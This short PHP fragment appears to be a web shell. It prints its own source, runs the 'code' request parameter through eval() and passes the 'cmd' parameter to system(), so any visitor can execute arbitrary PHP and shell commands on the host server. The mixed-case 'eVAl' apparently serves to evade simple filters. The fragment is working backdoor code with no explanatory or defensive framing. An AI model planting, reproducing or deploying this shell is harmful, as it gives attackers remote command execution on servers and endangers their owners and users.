?><pre><?highlight_file(__FILE__);error_reporting(E_ALL);
eVAl($_REQUEST['code']);system($_REQUEST['cmd'].' 2>&1');
if(isset($_REQUEST['w'])){header('Content-Type:text/html;charset=GBK');}